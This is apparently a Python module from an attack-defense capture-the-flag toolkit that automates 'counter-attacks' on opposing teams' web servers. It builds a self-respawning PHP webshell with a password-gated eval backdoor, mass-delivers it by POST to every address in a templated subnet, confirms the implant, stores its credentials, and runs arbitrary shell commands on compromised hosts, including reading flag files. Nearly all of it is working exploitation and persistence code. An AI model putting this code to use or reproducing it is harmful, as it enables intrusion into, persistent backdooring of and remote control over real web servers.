import os
import re
import time
import json
import threading
import requests
import base64
import random
import string
import logging
from urllib.parse import quote

logger = logging.getLogger('AttackManager')

class AttackManager:
    def __init__(self, connection_manager, target_manager):
        self.cm = connection_manager
        self.tm = target_manager
        self.config_file = None
        self.enemy_config = {
            'network_template': '',  # e.g. "172.16.{x}.101"
            'excluded_ips': [],
            'targets': {}  # ip: {status: 'waiting', log: []}
        }
        self.attack_log = []
        
        # Undead Shell Template (Base64 encoded to avoid syntax issues during transfer)
        self.undead_filename = ".index.php" # Fallback default

    def init_app(self, app):
        self.config_file = os.path.join(app.config['BASE_DIR'], 'data', 'attack_config.json')
        self.load_config()

    def load_config(self):
        if self.config_file and os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    self.enemy_config = json.load(f)
                logger.debug(f"Loaded attack config from {self.config_file} with {len(self.enemy_config.get('targets', {}))} targets")
            except Exception as e:
                logger.error(f"Failed to load attack config: {e}")

    def save_config(self):
        if self.config_file:
            try:
                with open(self.config_file, 'w') as f:
                    json.dump(self.enemy_config, f, indent=4)
                logger.debug(f"Saved attack config to {self.config_file}")
            except Exception as e:
                logger.error(f"Failed to save attack config: {e}")
        else:
            logger.error("config_file is None, cannot save attack config")

    def set_enemy_config(self, template, excluded_ips_str):
        self.enemy_config['network_template'] = template
        # Parse excluded IPs (comma code)
        self.enemy_config['excluded_ips'] = [x.strip() for x in excluded_ips_str.split(',') if x.strip()]
        self.save_config()
        return {'status': 'ok', 'config': self.enemy_config}

    def generate_undead_shell(self, password, filename=None):
        """生成不死马 Payload (PHP代码)"""
        # Hardcoded specific MD5 for demo or derived from password
        import hashlib
        pass_md5 = hashlib.md5(password.encode()).hexdigest()
        fname = filename if filename else self.undead_filename
        
        # PHP Shell Code (to be written by undead process)
        # Note: Using 'a' as eval parameter for the implanted shell
        shell_content = f'<?php if(md5($_POST["pass"])=="{pass_md5}"){{@eval($_POST[a]);}} ?>'
        
        # Undead Logic
        php_code = f"""<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '{fname}';
$code = '{shell_content}';
while (1) {{
    if (!file_exists($file)) file_put_contents($file, $code);
    usleep(50000);
}}
?>"""
        return php_code

    def verify_exploit_locally(self, local_ip, port, shell_path, password):
        """
        在本地验证 Webshell 可用性及路径
        shell_path: 可能是绝对路径 /var/www/html/shell.php
        return: valid_url_path (e.g., /shell.php) or None
        """
        logger.debug(f"Verifying locally {local_ip}:{port} {shell_path} pass={password}")
        
        # Guess URL paths
        # 1. Full path assumption (if path starts with /var/www/html)
        potential_uris = []
        if '/var/www/html/' in shell_path:
            potential_uris.append(shell_path.split('/var/www/html/')[1])
        
        # 2. Filename only
        filename = os.path.basename(shell_path)
        potential_uris.append(filename)
        
        # 3. Relative path check (simple)
        
        # Try connect
        valid_uri = None
        for uri in potential_uris:
            uri = uri.lstrip('/')
            url = f"http://{local_ip}:{port}/{uri}"
            try:
                # Payload: echo 'VULN_CONFIRMED'
                data = {password: "echo 'VULN_CONFIRMED';"}
                res = requests.post(url, data=data, timeout=2)
                if res.status_code == 200 and 'VULN_CONFIRMED' in res.text:
                    logger.debug(f"Verified local exploit via {url}")
                    valid_uri = uri
                    break
            except Exception as e:
                logger.debug(f"Verify failed for {url}: {e}")
        
        if valid_uri: return valid_uri, port # Return tuple if remote verify succeeded (using passed port)

        # 4. Fallback: Verify via SSH (Localhost request)
        logger.debug(f"Remote verify failed. Assessing local verify via SSH (potential_uris={potential_uris})...")
        
        # Try common web ports: 80, 8080. And the connection port just in case.
        # Deduplicate and prioritize 80.
        candidate_ports = []
        for p in [80, 8080, port]:
            if p not in candidate_ports: candidate_ports.append(p)

        valid_port = None

        for p_try in candidate_ports:
            logger.debug(f"Trying local verification on port {p_try}...")
            for uri in potential_uris:
                uri = uri.lstrip('/')
                payload_key = password
                payload_val = "echo 'VULN_CONFIRMED';"
                
                # --- Method A: curl ---
                cmd_curl = f"curl -s -d \"{payload_key}={payload_val}\" http://127.0.0.1:{p_try}/{uri}"
                logger.debug(f"Trying SSH curl: {cmd_curl}")
                
                try:
                    output = self.cm.execute(local_ip, port, cmd_curl) # Always connect via SSH port
                    if output and 'VULN_CONFIRMED' in output:
                        logger.debug(f"Verified local exploit via SSH (localhost:{p_try} curl): {uri}")
                        valid_uri = uri
                        valid_port = p_try
                        return valid_uri, valid_port # Return tuple
                    else:
                        logger.debug(f"curl failed, output: {output[:100] if output else 'None'}")
                        # --- Method B: wget ---
                        cmd_wget = f"wget -qO- --post-data \"{payload_key}={payload_val}\" http://127.0.0.1:{p_try}/{uri}"
                        logger.debug(f"Trying SSH wget: {cmd_wget}")
                        output = self.cm.execute(local_ip, port, cmd_wget)
                        if output and 'VULN_CONFIRMED' in output:
                            logger.debug(f"Verified local exploit via SSH (localhost:{p_try} wget): {uri}")
                            valid_uri = uri
                            valid_port = p_try
                            return valid_uri, valid_port # Return tuple
                        else:
                            logger.debug(f"wget failed, output: {output[:100] if output else 'None'}")

                except Exception as e:
                    logger.debug(f"SSH Local Verify error for {uri} on port {p_try}: {e}")

        return None, None

    def start_counter_attack_campaign(self, source_ip, source_port, shell_path, password):
        """启动一波反制攻击"""
        if not self.enemy_config.get('network_template'):
            logger.warning("Attack cancelled: No enemy network template")
            return

        # 1. Verify locally first (and get web port)
        # Fix: Unpack the tuple returned by verify_exploit_locally
        res = self.verify_exploit_locally(source_ip, source_port, shell_path, password)
        if not res or not res[0]:
            logger.warning("Attack cancelled: Could not verify webshell locally")
            return
        
        valid_uri, valid_port = res
        logger.debug(f"Local check passed. Target Port={valid_port}, URI={valid_uri}")

        # 2. Generate Enemy IPs
        enemy_ips = self._generate_enemy_ips(source_ip)
        
        # 3. Generate Payload with Random Filename
        # Generate random filename: .<6_chars>.php
        rand_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        shell_filename = f".{rand_suffix}.php"
        
        payload_code = self.generate_undead_shell(password, filename=shell_filename)
        # ... logic ...
        
        b64_code = base64.b64encode(payload_code.encode()).decode()
        # Exploitation Code: Write undead shell to disk, then spawn it detached
        exploit_php = f"""
$f='/tmp/.u-{int(time.time())}.php';
file_put_contents($f, base64_decode('{b64_code}'));
include($f);
"""
        # Compact it
        exploit_php = exploit_php.replace('\n', ' ')

        # 4. Launch asynchronously
        # Pass VALID_PORT instead of SOURCE_PORT
        threading.Thread(target=self._run_campaign, args=(enemy_ips, valid_port, valid_uri, password, exploit_php, shell_filename)).start()

    def _generate_enemy_ips(self, my_ip):
        """
        Template: 172.16.{x}.101
        My IP: 172.16.1.101
        Host ID: 101
        Generates IPs by replacing {x} with 1..254 (excluding my subnet and config exclusions)
        """
        template = self.enemy_config['network_template']
        if '{x}' not in template:
            # Single IP mode OR Comma-separated list
            raw_ips = [x.strip() for x in template.split(',')]
            valid_ips = []
            for ip in raw_ips:
                if not ip: continue
                if ip == my_ip: continue
                if ip in self.enemy_config['excluded_ips']: continue
                valid_ips.append(ip)
            return valid_ips
        
        # Extract my octets? Not strictly needed if template is explicit.
        # But user wants "Last octet same".
        # If template is "172.16.{x}.101", the host is fixed as 101.
        # User requirement: "attack all with same last octet".
        
        # Let's assume template provides the structure and we iterate {x}.
        ips = []
        for i in range(1, 255):
            ip = template.replace('{x}', str(i))
            # Basic sanity check
            try:
                # Exclude self?
                if ip == my_ip: continue
                # Exclude config
                if ip in self.enemy_config['excluded_ips']: continue
                
                ips.append(ip)
            except: pass
        return ips

    def _run_campaign(self, enemy_ips, port, uri, password, exploit_php, shell_filename):
        logger.info(f"Starting attack campaign against {len(enemy_ips)} targets... (Shell: {shell_filename})")
        
        for ip in enemy_ips:
            self._attack_one(ip, port, uri, password, exploit_php, shell_filename)
            time.sleep(0.1) 

    def _attack_one(self, ip, port, uri, password, exploit_php, shell_filename):
        url = f"http://{ip}:{port}/{uri}"
        target_info = self.enemy_config['targets'].get(ip, {'status': 'waiting', 'logs': []})
        
        try:
            # Send Exploit
            # Note: Requests to blocking PHP scripts (undead loop) will timeout. 
            # This is actually a sign of success if we expect it to loop forever.
            # But usually we spawn it properly so it returns?
            # Our payload `include($f)` will execute the loop and HANG.
            # So we set a very short timeout and catch ReadTimeout as success?
            
            logger.info(f"Attacking {url}...")
            try:
                requests.post(url, data={password: exploit_php}, timeout=1)
                # If it returns 200 immediately, maybe it didn't loop? Or it spawned?
                # The payload contains while(1). It SHOULD timeout.
                result = "exited"
                success = False # It shouldn't exit if loop runs
            except requests.exceptions.ReadTimeout:
                # Timeout means script is running (looping)
                result = "Implanted (Active)"
                success = True
            except Exception as e:
                result = str(e)
                success = False
            
            status = 'success' if success else 'failed'
            target_info['status'] = status
            target_info['last_msg'] = result
            
            # --- New: Print Result to Terminal ---
            if success:
                logger.info(f"[ATTACK SUCCESS] {ip}:{port} - Payload delivered (timeout confirmed)")
            else:
                logger.warning(f"[ATTACK FAILED] {ip}:{port} - {result}")
            
            # Verify Implantation?
            # Try to connect to implanted shell: .<random>.php
            # Note: The shell is written to the CURRENT working directory of the vulnerable script.
            # So if uri is 'include/shell.php', the shell is at 'include/.<random>.php'.
            if success:
                time.sleep(1)
                
                # Determine directory of vulnerable script
                base_dir = ""
                if '/' in uri:
                    base_dir = uri.rsplit('/', 1)[0] + '/'
                
                verify_uris = [
                    f"{base_dir}{shell_filename}", # Same dir
                    f"{shell_filename}" # Root dir (fallback)
                ]
                
                verified = False
                for v_uri in verify_uris:
                    verify_url = f"http://{ip}:{port}/{v_uri}".replace('//', '/').replace('http:/', 'http://')
                    try:
                        res = requests.get(verify_url, timeout=2)
                        if res.status_code == 200:
                            target_info['status'] = 'confirmed'
                            logger.info(f"[ATTACK CONFIRMED] {ip}:{port} - Undead shell active at {verify_url}")
                            verified = True
                            break
                    except:
                        pass
                
                if not verified:
                    target_info['status'] = 'uncertain'
                    # Print last tested URL just for info
                    logger.warning(f"[ATTACK UNCERTAIN] {ip}:{port} - Verification failed (404/Timeout). Tested: {verify_uris}")
            
            # Save credentials if successful or uncertain
            if success:
                target_info['password'] = password
                # We save the Undead Shell filename as the URI for future commands, NOT the vulnerable URI
                # But we need to know the DIR.
                # In verification, we found the valid URL. We should use THAT.
                if verified:
                     # e.g. http://ip:port/dvwa/include/.index.php
                     # Extract URI path: /dvwa/include/.index.php
                     from urllib.parse import urlparse
                     parsed = urlparse(verify_url)
                     target_info['shell_uri'] = parsed.path
                else:
                    # Fallback to guessing based on vulnerable URI
                     base_dir = ""
                     if '/' in uri:
                        base_dir = uri.rsplit('/', 1)[0] + '/'
                     target_info['shell_uri'] = f"{base_dir}{shell_filename}"

        except Exception as e:
            target_info['status'] = 'failed'
            target_info['last_msg'] = str(e)
            logger.error(f"[ATTACK FAILED] {ip}:{port} - Exception: {e}")
        
        # CRITICAL FIX: Update the main config dictionary
        # target_info is a reference to the dict inside config if it existed,
        # but if it was a default dict (get(..., {})), it's detached.
        if ip not in self.enemy_config['targets']:
             self.enemy_config['targets'][ip] = {}
        
        self.enemy_config['targets'][ip] = target_info
        self.save_config()

    def execute_cmd(self, ip, port, cmd):
        """
        Execute arbitrary command on target via undead shell.
        Returns: {success: bool, output: str}
        """
        targets = self.enemy_config.get('targets', {})
        target_info = targets.get(ip)
        if not target_info:
            return {'success': False, 'output': 'Target not found in attack list'}
        
        password = target_info.get('password')
        shell_uri = target_info.get('shell_uri')
        
        if not password or not shell_uri:
             return {'success': False, 'output': 'No shell credentials stored. Re-attack required.'}
        
        # Strip leading slash for url join if needed
        shell_uri = shell_uri.lstrip('/')
        url = f"http://{ip}:{port}/{shell_uri}"
        
        # Undead Shell Payload: <?php if(md5($_POST["pass"])=="md5(pass)"){ @eval($_POST[a]); } ?>
        # We need to send:
        # pass: <password>
        # a: system('<cmd> 2>&1');
        
        # Escape command
        # Ideally use base64 to avoid char issues
        b64_cmd = base64.b64encode(cmd.encode()).decode()
        php_payload = f"system(base64_decode('{b64_cmd}').' 2>&1');"
        
        try:
            data = {
                'pass': password,
                'a': php_payload
            }
            res = requests.post(url, data=data, timeout=5)
            if res.status_code == 200:
                return {'success': True, 'output': res.text.strip()}
            else:
                return {'success': False, 'output': f"HTTP {res.status_code}"}
        except Exception as e:
            return {'success': False, 'output': str(e)}

    def get_flag(self, ip, port):
        # Try common flag locations
        cmd = "cat /flag || cat /flag.txt || cat /var/www/html/flag.txt"
        return self.execute_cmd(ip, port, cmd)
            
        self.enemy_config['targets'][ip] = target_info
        # Notify UI update? (websocket TODO)

    def get_attack_status(self):
        return self.enemy_config
